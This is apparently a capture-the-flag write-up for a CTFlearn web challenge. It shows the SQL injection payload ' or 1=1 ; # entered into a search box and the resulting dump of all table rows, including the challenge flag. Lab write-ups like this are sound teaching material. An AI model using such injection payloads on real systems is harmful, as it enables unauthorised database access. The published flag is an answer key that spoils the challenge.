# Basic Injection

See if you can leak the whole database. The flag is in there somwhere... `https://web.ctflearn.com/web4/`

Inside the input box, enter the following sql injection payload:

```text
' or 1=1 ; #
```

Then, we will see the following result:

```text
Name: Luke
Data: I made this problem.
Name: Alec
Data: Steam boys.
Name: Jalen
Data: Pump that iron fool.
Name: Eric
Data: I make cars.
Name: Sam
Data: Thinks he knows SQL.
Name: fl4g__giv3r
Data: th4t_is_why_you_n33d_to_sanitiz3_inputs
Name: snoutpop
Data: jowls
Name: Chunbucket
Data: @datboiiii
```

Hence, the flag should be `th4t_is_why_you_n33d_to_sanitiz3_inputs`
